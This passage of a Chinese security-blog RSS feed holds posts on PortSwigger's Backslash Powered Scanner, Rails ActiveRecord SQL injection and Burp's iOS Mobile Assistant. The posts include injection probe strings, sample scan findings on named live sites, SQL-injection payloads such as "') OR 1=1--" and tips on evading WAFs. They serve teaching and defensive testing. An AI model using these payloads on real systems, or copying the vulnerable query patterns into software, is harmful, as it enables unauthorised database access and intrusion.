+ \x41 =&amp;gt; \x41&lt;/code&gt;&lt;p&gt;上面这组测试说明了“{”这个字符具有特殊的意义。通过多次重复和完善探测的过程，可以循环成一个‘实施’阶段，自动化实行。下面这张扫描器截图展示一个易受到 Markdown 注入的页面的输出情况：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-63540bf7823bde3839b1530d266a8797.png_r.jpg&quot;&gt;&lt;p&gt;这是一个没有什么薄弱点的页面，只不过是在输入上调用了 stripslashes() (注释：用于删除反斜杠)&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e30f60342a271510aa4b8c49b983a17d.png_r.jpg&quot;&gt;&lt;p&gt;这种自动化跟进意味着我们将一目了然的知道端点的可利用性。潜在的进一步优化是对具体转换的指纹的识别与分类。&lt;/p&gt;&lt;p&gt;值得注意的是即使这种技术有能力检测出大量的脆弱点，在大部分输入上，它只会发送一次单独的请求。这种灵活性和效率性的组合是迭代扫描的核心。&lt;/p&gt;&lt;p&gt;如果你意识到（或者能构建）目标是明显存在问题的，则可以验证扫描器的误报率。作者发现扫描器无法识别 JSON 响应中的漏洞，因为虽然服务端会将\\解码成\，但是当其被嵌入 JSON字符串的时候会重新从\转义成\\。通过在适当的地方进行 JSON 解码响应很容易能解决这个问题。&lt;/p&gt;&lt;p&gt;不幸的是，还有一个更为严重的弱点。这种扫描方式依赖于用户的输入被处理后展示出来。例如，如果一个应用程序将用户的输入拼接一个 SQL 的 SELECT 语句中，但是并不会显示该查询，这个漏洞将会被完全忽视掉。这是一个最根本的缺陷，依赖于可疑的输入转换来检测漏洞。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Probe-Pair Fuzzing&lt;/b&gt;&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;&lt;b&gt;核心逻辑&lt;/b&gt;&lt;br&gt;&lt;br&gt;我们可以通过分析整个响应内容和判断我们的输入是否造成了明显的变化来避免依赖于输入转换。在最基本的情况下，这与经典的 webapp fuzzer 非常的相似（在应用程序中提供输入来查看是否崩溃），并且很多渗透测试者都很熟悉适用 Burp Intruder 和 fuzzlists 来实现部分自动化。他们并不会局限于只是查看自动扫描结果的状态码和检查错误信息，而是将细微到某个单独的单词或者空白行的消失都当作是一种变化。&lt;p&gt;就像手工测试者一样，我们可以利用探针来获取更多的信息。首先，我们通过发送包含随机字母数字字符的探针来识别出应用程序正常的响应。这将会被当作是一个基准响应。如果携带’的探针获得的响应始终与基准响应不同，那么就可以断定’这个字符对于应用程序来说有着特殊的意义。但这并不表明就是一个漏洞，或许只是因为应用程序拒绝携带’的输入。再次的，我们可以利用 backslashes 来摆脱这个困境。如果应用程序对于携带\’的探针的响应与随机字母数字的探针响应相同，我们便可以断定对于’的异常响应是因为未能逃逸。下面的图可能更有意义。笑脸和哭脸分别代表了 ’interseting’ 和 ’boring’ ：&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-afb7fc8bafee2c63e2d6ad7138105b80.png_r.jpg&quot;&gt;&lt;br&gt;这种技术并不仅局限于识别字符串的注入。我们还可以通过替换探针来识别其他各种环境的注入。每一种额外的探针都只需要几行代码，所以我们已经在使用不少的代码了：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&#39; vs \&#39; // single-quoted string
+&#39; vs &#39;&#39; // single-quoted string (alternative escaping)
+&quot; vs \&quot; // double-quoted string
+7/0 vs 7/1 // number
+${{ vs $}} // interpolation
+/**/ vs /*/ // raw code
+,99 vs ,1 // order-by
+sprintz vs sprintf // function name&lt;/code&gt;&lt;p&gt;我们还可以通过很多探针的共同使用迭代搜集一个潜在漏洞的信息。当遇到一个字符串注入时，Backslash Powered Scanner 将首先识别正在使用的引号，接着是字符的连接方式，识别可能的函数调用，最后发送一组特定语言的函数尝试来识别后端语言。下面的一个截图展示了一个指出了有 Javascript 注入漏洞的应用程序的扫描输出。注意，每个阶段获取的信息都被用于下个阶段。&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-8821bbb90fcd3fd43f67d970d3d97e0b.png_r.jpg&quot;&gt;&lt;br&gt;即使扫描器无法识别确切的漏洞，它依然会报告漏洞：它仅显示所有成功的探针。这意味着它有效的将输入分成三类:’boring’(没有问题存在的)，’vulnerable’（一种显然存在漏洞的已知语言）,’interseting’（很多探针成功，应用程序容易受到未知问题的影响）。&lt;br&gt;&lt;/p&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;&lt;b&gt;类型的变化&lt;/b&gt;&lt;br&gt;应用程序以两种不同方式之一来处理修改后的输入。大多数输入容易受到服务端注入的影响，特别是那些来源于于自由文本格式的输入，例如评论，只有当触及语法错误时服务端才会显示不同的响应：&lt;code lang=&quot;text&quot;&gt;/post_comment?text=baseComment 200 OK
+/post_comment?text=randomtext 200 OK
+/post_comment?text=random&#39;text 500 Oops
+/post_comment?text=random\&#39;text 200 OK&lt;/code&gt;&lt;p&gt;其他的输入上，任何与预期输入不同都会引起一个错误：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;/profile?user=bob 200 OK
+/profile?user=randomtext 500 Oops
+/profile?user=random&#39;text 500 Oops
+/profile?user=random\&#39;text 500 Oops
+/profile?user=bo&#39;||&#39;b 200 OK
+/profile?user=bo&#39;|z&#39;b 500 Oops
+&lt;/code&gt;&lt;p&gt;后一种情况很难处理。为了找到这样响应的漏洞，我们需要跳过引号识别阶段并且猜测字符的连接方式以找出漏洞的证明，这使扫描器效率更低。由于无法将随机文本放入探针中，我们被限制在一定数量的唯一探针，使得可靠的指纹识别响应变得更加困难。在写这篇文章时，扫描器还不会处理这种情况。&lt;/p&gt;&lt;p&gt;这种限制不适用于检测数字注入的输入 -- 给定了一个基数，使用简单的算术有无数的方式能够表达相同的数目。我选择x/1和x/0，因为除以零的好处时会在某些情况下抛出异常。&lt;/p&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;识别有意义的响应差异&lt;/b&gt;&lt;br&gt;这种技术的核心问题是识别应用程序对两个不同探针的响应是否一致。只是一个简单的字符串的比较在整个应用程序中是没有什么作用的，因为应用程序本身就是动态的。响应中充满了动态生成的一次性令牌，时间戳，缓存以及对输入的响应。&lt;/p&gt;&lt;p&gt;作者三年前遇到这个问题时，他意识到响应是由静态的内容和动态的 ’fuzzy points’ 共同组成独。因此，作者尝试用一组响应来生成一个正则表达式，将静态的内容与通配符拼接到一起。为了简洁起见，作者只提及了这种方法的一些小问题。最开始，计算密集度，作者使用的最长公共子序列的实现是 O(n2)；处理响应花费的时间与响应长度的平方成正比。正则表达式通常十分复杂，因此扫描到错误的应用程序会导致扫描器停止工作。它也无法处理和正则完全不同的应用程序响应，也无法处理顺序改变的响应。甚至响应中的时间戳也引起了困难，因为有些时间戳每10，60或者100秒才会产生改变。最后，调试起来非常困难，因为响应内容与500多行的正则表达式不匹配的原因很难确定。这些问题听起来好像都可以解决，但是作者尝试解决他们这也是为什么扫描器代码在两年前没有放出来。&lt;/p&gt;&lt;p&gt;相反的，Backslash Powered Scanner 使用更简单的方法计算每个响应的属性值，并注意到响应中的哪些属性没有发生变化。其中包括状态码，content type，HTML 结构，行数，单词数，输入的处理数量以及各种关键字的出现频率。&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;Hunting Findings&lt;/b&gt;&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;&lt;b&gt;分布式扫描系统&lt;/b&gt;&lt;br&gt;&lt;br&gt;为了保证扫描器在扫网站的时候不会出现发包过快导致 IP 被屏蔽的问题，以及扫描时超出授权的测试范围，我需要限制它每3秒向一个网站发送一个请求，但 Burpsuite 只支持线程调节，为此，我又写了一个扩展，用于实现分流，也就是前面说的功能，它可以在不同的主机上交叉扫描，提供整体扫描速度，又不被屏蔽。还有就是可以只扫描不常用的参数等。&lt;/li&gt;&lt;li&gt;&lt;b&gt;样本结果&lt;/b&gt;&lt;br&gt;&lt;br&gt;为了说明扫描器所提供的发现的漏洞类型以及如何阐述他们，作者将检查一组选定的扫描结果。这或许会帮助我们理解为什么 Backslash Powered Scanner 相比起像一个漏扫，更像是一个技术理解有限的助理。&lt;/li&gt;&lt;ol&gt;&lt;li&gt; Mysql injection &lt;br&gt;&lt;br&gt;以下结果来源于一个User-Agent头存在SQL注入的站点：&lt;code lang=&quot;text&quot;&gt;Basic fuzz (\z`z&#39;z&quot;\ vs \`z\&#39;z\&quot;\\)
+Content: 5357 vs 5263
+
+String - apostrophe (\zz&#39;z vs z\\\&#39;z)
+Content: 5357 vs 5263
+
+Concatenation: &#39;|| (z||&#39;z(z&#39;z vs z(z&#39;||&#39;z)
+Content: 5357 vs 5263
+
+Basic function injection (&#39;||abf(1)||&#39; vs &#39;||abs(1)||&#39;)
+Content: 5281 vs 5263
+
+MySQL injection (&#39;||power(unix_timestanp(),0)||&#39; vs &#39;||power(unix_timestamp(),0)||&#39;)
+Content: 5281 vs 5263&lt;/code&gt;&lt;br&gt;扫描器识别出输入是’interesting’，并且通过注入一个只存在于 Mysql 中的函数正确的识别出了漏洞。’Content:5357 VS 5263’这样的一行是用来表示扫描器对比了两个结果。在这个例子里，两个响应中单词的数目是不同的。当这么多数量的证据显现出来时，那么问题就不太可能是假的。&lt;br&gt;&lt;/li&gt;&lt;li&gt;存在过滤的 code injection&lt;br&gt;&lt;br&gt;下面这个例子来源于一个已经经过多次测试的网站，这将充分展现扫描器的能力：&lt;code lang=&quot;text&quot;&gt;String - doublequoted (\zz&quot; vs \&quot;) 
+error: 1 vs 0 
+Content: 9 vs 1 
+Tags: 3 vs 0 
+
+Concatenation: &quot;. (z.&quot;z(z&quot;z vs z(z&quot;.&quot;z) 
+error: 1 vs 0 
+Content: 9 vs 1 
+Tags: 3 vs 0 
+
+Interpolation - dollar (z${{z vs }}$z) 
+error: 1 vs 0 
+Content: 9 vs 1 
+Tags: 3 vs 0&lt;/code&gt;&lt;p&gt;这是一个容易受到 PHP 代码注入的点，但是应用程序过滤了括号。因为括号被过滤，所以扫描器就无法注入一个函数，但是可以一点一点的手工测试尝试执行任意的shell命令。&lt;/p&gt;&lt;p&gt;作者认为这样的问题被之前的渗透测试人员忽略可能是因为注入点在文件路径处，这不是一个手工测试者会花费大量时间测试代码执行的地方。但为什么应用程序会在一个路径上调用 eval()，这就不得而知了。&lt;/p&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;以前存在过的漏洞&lt;br&gt;&lt;br&gt;以下的发现表明当前状态的 sea.ebay.com 站点上的输入是很容易受到 PHP 代码执行攻击的。可以清晰的看到应用程序对携带“{”的输入所产生的完全不同的响应。&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7cb04e207cce4631e7687da49d6c695b.png_r.jpg&quot;&gt;值得注意的是响应状态与测试者预期的情况完全不同，应当使服务器报错的${{z却使200的状态，而本应该无害的字符却导致了500的错误。搜索功能虽然损坏了，但是扫描器却能给我们一个信息，就是这儿以前可能存在这样的漏洞。因为扫描器具有极高的效率，因此在每一个输入点上都尝试 PHP 的 bypass 序列是完全合理的。&lt;br&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;正则表达式注入&lt;br&gt;&lt;br&gt;扫描器经常会报告很多正则表达式注入，这是一个低危漏洞，它可以干扰应用程序的运行，严重时可能会导致拒绝服务。但有一个例外的是，当服务器上的 PHP 版本低于5.4.7时，利用&lt;a href=&quot;https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace&quot; data-title=&quot;null byte to specify the &#39;e&#39; flag&quot; class=&quot;&quot; data-editable=&quot;true&quot;&gt;null byte to specify the &#39;e&#39; flag&lt;/a&gt;，这个注入将会升级为任意代码执行。这个技术被用来&lt;a href=&quot;https://www.phpmyadmin.net/security/PMASA-2016-27/&quot; data-title=&quot;攻击过phpmyadmin&quot; class=&quot;&quot; data-editable=&quot;true&quot;&gt;攻击过phpmyadmin&lt;/a&gt;，作者证实了扫描器能找到这种漏洞，通常的报告如下：&lt;code lang=&quot;text&quot;&gt;Diffing scanner:
+Backslash (\ vs \\)
+
+Transformation Scanner:
+\0 =&amp;gt; Truncated 
+\1 =&amp;gt; Truncated 
+\$ =&amp;gt; &amp;gt;nbsp;
+$ =&amp;gt; $&lt;/code&gt;&lt;p&gt;\0经常被用于识别正则表达式注入。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;GET /folder?q=foo\0bar HTTP/1.1
+
+HTTP/1.1 301 Moved Permanently
+Location:
+https://redacted.com/folder/?q=foohttp://redacted.com/folder/bar&lt;/code&gt;&lt;/li&gt;&lt;li&gt;Escaping Flaws&lt;br&gt;&lt;br&gt;扫描器发现了一个有趣却无用的缺陷，一个流行框架将输入放入了 cookie 中：&lt;br&gt;&lt;code lang=&quot;text&quot;&gt;foo&quot;z: Set-Cookie: bci=1234; domain=&quot;foo\&quot;z&quot;;
+foo\: Set-Cookie: bci=1234; domain=&quot;foo\&quot;;
+foo&quot;z\: 500 Internal Server Error&lt;/code&gt;这个框架是非常受欢迎的，作者添加了新的探针来跟进分类这个问题，让其余的测试者可以不用在这个上浪费时间：&lt;br&gt;&lt;code lang=&quot;text&quot;&gt;Basic fuzz  (\z`z&#39;z&quot;\ vs \`z\&#39;z\&quot;\\)
+    exception: 1 vs 0
+ Doublequote plus slash  (z&quot;z\ vs z\z)
+    exception: 1 vs 0&lt;/code&gt;&lt;/li&gt;&lt;li&gt; Semantic False Positives&lt;br&gt;&lt;br&gt;利用一个构造的词来测试功能注入：&lt;br&gt;&lt;code lang=&quot;text&quot;&gt;Function hijacking (sprintg vs sprintf) 
+&amp;lt;div: 13 vs 14&lt;/code&gt;&lt;br&gt;URL: &lt;a href=&quot;https://code.google.com/hosting/search?q=sprintg&quot; class=&quot;&quot;&gt;https://code.google.com/hosting/search?q=sprintg&lt;/a&gt;显而易见存在这个问题，参数 q用来搜寻一个很大的 codebase ，其中 ’sprintf’ 是比 ’sprintg’ 更为常用的术语。搜索功能经常被扫描器列为优先搜索，特别是那些支持高级语法的功能，他们很多时候和代码执行很相似。&lt;br&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt; 应用程序防火墙&lt;br&gt;&lt;p&gt;应用程序防火墙对于为扫描器提供了另一种 ’interesting’ 输入的识别。扫描器发现内联注释的代码被防火墙所忽略：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;0/**z&#39;*/ vs 0/*/*/z&#39;*/&lt;/code&gt;&lt;p&gt;手工测试显示，即使被 HTML 注释，iframe 还是能识别&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;0&amp;lt;!--foo--&amp;gt; vs 0&amp;lt;!--foo-&amp;gt;
+0&amp;lt;iframe&amp;gt; vs 0&amp;lt;zframe&amp;gt;&lt;/code&gt;&lt;p&gt;看起来好像是防火墙为了删除有害的 HTML 标签和注释而重写了输入。输入重写能很好的使 xss 过滤器失效。像之前一样，我们自动化跟进 HTML 注释，防止在测试中再次遇到这样的 WAF。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;SOLR JSON Injection&lt;br&gt;&lt;br&gt;扫描器标记了很多搜索功能的有趣行为:&lt;code lang=&quot;text&quot;&gt;Basic fuzz (\z`z&#39;z&quot;\ vs \`z\&#39;z\&quot;\\) 
+Content: 1578 vs 1575 
+Backslash (\ vs \\) 
+Content: 1576 vs 1575 
+String - doublequoted (\zz&quot; vs \&quot;) 
+Content: 1578 vs 1575&lt;/code&gt;&lt;p&gt;手工测试显示应用程序会解码输入的 UNICODE -即查找\u006d\u0069\u0072\u0072\u006f\u0072和查找’mirror’是一样的结果。这表明用户的输入没有经过转义直接进入到了 json 里面，这样的话我们就有可能突破查询字符串并更改查询结构。&lt;/p&gt;&lt;br&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/ol&gt;&lt;br&gt;&lt;h2&gt;&lt;b&gt;得到的教训&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这些例子都清晰的表明，迭代过程是非常重要的，这意味着测试者可以一目了然的将一个明显的问题和需要多次验证的问题进行区分。目前，搜索功能，WAF 和正则表达式注入还有待发展，暂时不会导致任何有利用价值的漏洞。由于探针的灵活性，我们几乎可以将以后遇到的各种问题都加入到探针中进行自动化跟进分类。&lt;/p&gt;&lt;p&gt;扫描器还能获得很多有用的信息，虽然有些并不会导致漏洞。&lt;/p&gt;&lt;p&gt;很多应用程序上的漏洞都被 WAF 所防御，因为 payload 的简洁性导致他们往往会被检测，但是作者发现 WAF 会忽略一些来自可信 IP 的数据，因此作者尝试了分布式发包来使得办公室的IP 不会被 ban。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;后续研究&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;扫描器所使用的技术和代码已经能够检测远超服务端注入的漏洞。作者将继续尝试让扫描器识别 WAF 和搜索功能。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;结论&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;经典扫描器在扫描服务端的注入漏洞时存在着几个盲点。通过对手工测试方式的模拟，开发了一款能够避免这些盲点并且十分高效的扫描器。这款扫描器目前将输入分为 ’boring’, ’interesting’ 和 ’vulnerable’ 三种情况。’interesting’ 需要测试者手动检查，因此，目前这个扫描器仅适用于安全从业者。但是，随着时间的推移，更多的 ’interesting’ 将会慢慢变为 ’vulnerable’，这款扫描器将会适用于更为广泛的用户。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Burpsuite 中开启反斜线探索式扫描&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在 BApp Store 中直接安装「Backslash Powered Scanning」这个扩展，其它情况可以参考扩展的开源地址的安装方式：&lt;a href=&quot;https://github.com/portswigger/backslash-powered-scanner#installation&quot; data-editable=&quot;true&quot; data-title=&quot;PortSwigger/backslash-powered-scanner&quot; class=&quot;&quot;&gt;PortSwigger/backslash-powered-scanner&lt;/a&gt;。&lt;/p&gt;&lt;p&gt;安装好之后我们只需要开启代理，访问需要测试的站点，再到「Target」中对目标站点开启「Acitvely scan this host」也就是主动扫描即可进行测试。&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1952596ec01945f7952ef42334c85023.png_r.jpg&quot; data-rawwidth=&quot;395&quot; data-rawheight=&quot;142&quot;&gt;开启扫描后，我们打开「Scanner 」模块，如果出现 Interesting 开头的的 Issue，就表示这可能是一个有趣的漏洞了，Boring  则表示扫描器认为没什么用但符合扫描特征，而 Vuln 就是说扫描器已经验证是漏洞了。&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;参考链接：&lt;/b&gt;&lt;/h2&gt;&lt;a href=&quot;https://github.com/portswigger/backslash-powered-scanner&quot; data-editable=&quot;true&quot; data-title=&quot;PortSwigger/backslash-powered-scanner&quot; class=&quot;&quot;&gt;PortSwigger/backslash-powered-scanner&lt;/a&gt;&lt;a href=&quot;https://github.com/portswigger/backslash-powered-scanner&quot; data-editable=&quot;true&quot; data-title=&quot;PortSwigger/backslash-powered-scanner&quot; class=&quot;&quot;&gt;&lt;br&gt;&lt;/a&gt;&lt;a href=&quot;http://blog.portswigger.net/2016/11/backslash-powered-scanning-hunting.html&quot; class=&quot;&quot; data-editable=&quot;true&quot; data-title=&quot;Backslash Powered Scanning: Hunting Unknown Vulnerability Classes&quot;&gt;Backslash Powered Scanning: Hunting Unknown Vulnerability Classes&lt;/a&gt;</description>
+<author>TwoSecurity</author>
+<guid isPermaLink="false">2017-05-30-27166471</guid>
+<pubDate>Sun, 01 Jan 2017 00:00:00 +0800</pubDate>
+</item>
+<item>
+<title>Rails 中 ActiveRecord 的不当使用产生 SQLi 风险</title>
+<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-05-26-27131797.htm</link>
+<description>&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;Rails 中 ActiveRecord 的不当使用产生 SQLi 风险&lt;/title&gt;
+&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/27131797&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
+Ruby on Rails 是一个经典的 MVC 框架。其中，ActiveRecord 是 MVC 中的 M（模型），负责处理数据和业务逻辑。每一个数据库表对应创建一个类，类的每一个对象实例对应于数据库中表的一行记录，通常表的每个字段在类中都有相应的 Field。ActiveRecord 同时负责把自己持久化，在 ActiveRecord 中封装了对数据库的访问，即 CURD。&lt;br&gt;&lt;br&gt;使用 ActiveRecord 执行 SQL 语句的大概顺序是：&lt;br&gt;&lt;ol&gt;&lt;li&gt;把提供的查询方法转换为等价的 SQL 查询。&lt;/li&gt;&lt;li&gt;触发 SQL 查询并从数据库中检索对应的结果。&lt;br&gt;&lt;/li&gt;&lt;li&gt;为每个查询结果实例化对应的模型对象。&lt;br&gt;&lt;/li&gt;&lt;li&gt;当存在回调时，先调用 after_find 回调再调用 after_initialize 回调。&lt;br&gt;&lt;/li&gt;&lt;/ol&gt;&lt;br&gt;只要能够理解第一步中的转换规则，那么针对 ActiveRecord 的 SQL 注入和普通的 SQL 注入并没有什么区别。&lt;p&gt;然而，Rails 为 ActiveRecord 方法提供了内置的 SQL 过滤器，用于转义 &#39;、&quot;、NULL 和换行符，使得大部分 SQL 注入都失去作用。但这并不代表开发者写出来的代码就是绝对安全的。如果没有对用户输入手动进行过滤，并且错误运用了某些方法，那么仍然存在 SQL 注入的风险。具体来讲，在使用某些方法时，需要手动触发这个过滤器。&lt;/p&gt;&lt;p&gt;所谓“错误使用“指的是，向某些方法传入 String 而不是 Array 或 Hash。因为在这种情况下，过滤器不会被触发。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-75b92d2df83de4662e105a85fca20ae1.png_r.jpg&quot; data-rawwidth=&quot;970&quot; data-rawheight=&quot;619&quot;&gt;&lt;h2&gt;&lt;b&gt;where&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;以常用的 where 方法作例子，它能够接受的参数类型有 string,array 和 hash。然而，过滤器只有当传入的参数是 array 或 hash 时才是生效。如果开发者直接传入一个 string 类型的参数，那么会带来严重的安全隐患，看下面这个例子:&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;User.where(&quot;name = &#39;#{params[:name]}&#39; AND password = &#39;#{params[:password]}&#39;&quot;)&lt;/code&gt;&lt;p&gt;其中，params[:name]和params[:password] 是表单提交的用户名和密码。转换后的 SQL 语句为：&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;SELECT &quot;users&quot;.* FROM &quot;users&quot; WHERE (name = &#39;params[:name]&#39;  AND password = &#39; params[:password]&#39;)&lt;/code&gt;&lt;p&gt;如果输入的 name为“&#39;) OR 1=1--“，那么 SQL 语句就会变成：&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;SELECT &quot;users&quot;.* FROM &quot;users&quot; WHERE (name = &#39;&#39;) OR 1=1--&#39; AND password = &#39;&#39;)&lt;/code&gt;&lt;p&gt;“OR 1”后面的内容全部被注释掉了，这是很常见的一句话密码，它和不使用 ORM 的情况下SQL 注入的 PAYLOAD 并无二异。&lt;/p&gt;&lt;p&gt;安全的写法如下：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;传入 Array：&lt;br&gt;&lt;code lang=&quot;text&quot;&gt;User.where(&quot;name = ? AND password =?&quot; , entered_user_name, entered_password)&lt;/code&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;或者传入 Hash：&lt;br&gt;&lt;code lang=&quot;text&quot;&gt;User.where(name : entered_user_name, password : entered_password )&lt;/code&gt;&lt;br&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;这两种情况下过滤器会被触发，输入的引号会被转义引起报错：&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;SELECT &quot;users&quot;.* FROM &quot;users&quot; WHERE (name = &#39;\&#39;) OR 1=1--&#39; AND password = &#39;&#39;)&lt;/code&gt;&lt;h2&gt;&lt;b&gt;find_by&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;同理，find_by 方法也有相同的问题，因为它等价于 where(*args).take:&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;params[:id] = &quot;admin = &#39;’ OR 1=1 )#&quot;
+User.find_by params[:id]&lt;/code&gt;&lt;p&gt;SQL 语句：&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;SELECT &quot;users&quot;.* FROM &quot;users&quot; WHERE (admin = &#39;’ OR 1=1 )#) LIMIT ?&lt;/code&gt;&lt;br&gt;&lt;p&gt;最安全的方式是传入 Hash:&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;User.find_by admin: params[:id]&lt;/code&gt;&lt;h2&gt;&lt;b&gt;Select/pluck&lt;/b&gt;&lt;/h2&gt;&lt;code lang=&quot;text&quot;&gt;Model.select(:field)&lt;/code&gt;&lt;p&gt;select 方法用于指定查询字段，如果传入的是 String,那么输入完全不会被转义：&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;params[:column] = &quot;* FROM users WHERE admin = &#39;t&#39; #&quot;
+User.select(params[:column])&lt;/code&gt;&lt;p&gt;&lt;br&gt;SQL：&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;SELECT * FROM users WHERE admin = &#39;t&#39; # FROM &quot;users&quot;&lt;/code&gt;&lt;p&gt;需要注意 select 方法返回的是 Model 类。&lt;br&gt;pluck 方法和 select 方法作用的地方一致，唯一的不同是 pluck 方法返回一个数组。&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;User.select(:id).map { |c| c.id } &lt;/code&gt;&lt;p&gt;&lt;br&gt;等价于：&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;User.pluck(:id)&lt;/code&gt;&lt;p&gt;因为 select 和 pluck 方法作用于 SQL 语句的最开始，因此 SQL 注入的方式非常灵活。&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;delete_all/destroy_all/update_all&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这三个批量操作方法都可以进行 SQL 注入，只要传入的参数是 String。&lt;br&gt;delete_all 和 destroy_all 的区别是 destroy_all 会触发 ActiveRecord 的回调，而 delete_all 会直接把 SQL 语句传给数据库，所以理论上 destroy_all 比 delete_all 更安全一点。总之，正确的使用方法是传入 Hash。&lt;br&gt;&lt;/p&gt;&lt;br&gt;&lt;h2&gt;&lt;b&gt;参考链接&lt;/b&gt;&lt;/h2&gt;&lt;a href=&quot;https://rails-sqli.org/&quot; data-editable=&quot;true&quot; data-title=&quot;Rails SQL Injection Examples&quot;&gt;Rails SQL Injection Examples&lt;/a&gt;</description>
+<author>TwoSecurity</author>
+<guid isPermaLink="false">2017-05-26-27131797</guid>
+<pubDate>Sun, 01 Jan 2017 00:00:00 +0800</pubDate>
+</item>
+<item>
+<title>Burp Suite Mobile Assistant</title>
+<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-05-17-26920791.htm</link>
+<description>&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;Burp Suite Mobile Assistant&lt;/title&gt;
+&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/26920791&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;    Burp Suite 在前段时间更新了v1.7.22版本，其中引入了一个新的模块： Mobile Assistant，它用于配合 Burp Suite 更方便地测试 iOS 应用程序。它可以修改 iOS 设备的系统代理设置，让  HTTP(S) 流量可以轻松重定位到电脑上正在运行的 Burp 。另外它还可以绕过你需要注入 App  的 SSL 证书的验证，拦截、检查和修改所有流量。&lt;/p&gt;&lt;br&gt;&lt;p&gt;&lt;b&gt;安装 Burp Suite Mobile Assistant&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;br&gt;&lt;p&gt;    因为其功能的性质，需要依赖越狱设备上的软件包管理器 Cydia，并且要注意的是，Mobile Assistant 有些功能目前不支持 iOS10，所以在想使用 Mobile Assistant 相应的功能的时候，注意自己设备的固件版本。&lt;/p&gt;&lt;p&gt;安装 Mobile Assiatant 有两种方法，首先是使用 Cydia 安装：&lt;/p&gt;&lt;br&gt;&lt;ol&gt;&lt;li&gt;在PC端打开 Burp Suite，设置好代理监听的接口以及端口，我这里设置的端口为8080，接口为我主机的 IP。&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-820e68fdb6e47b51af29865e05a76bdf.jpg_r.jpg&quot; data-rawwidth=&quot;1366&quot; data-rawheight=&quot;656&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;在越狱设备上打开 Cydia，打开软件源选项，再编辑、添加。&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-51be938e45618b21df182a05d0d2da21.png_r.jpg&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;1136&quot;&gt;&lt;/li&gt;&lt;li&gt;要使用 HTTP 协议，输入我们 Burp Suite 所在 PC 端的 IP 地址或主机名以及 Burp Suite 监听的端口号。如果 Cydia 无法连接，注意你的监听代理的设置是否正确以及检查计算机防火墙是否关闭。&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-af9e31a22ffe4b0857f302095fce6010.png_r.jpg&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;1136&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;添加成功后，Burp Suite 现在应该显示为单个源。&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-dceca89431e9872ef65045020f253a08.png_r.jpg&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;1136&quot;&gt;&lt;/li&gt;&lt;li&gt;点开单个源:&lt;br&gt;&lt;img 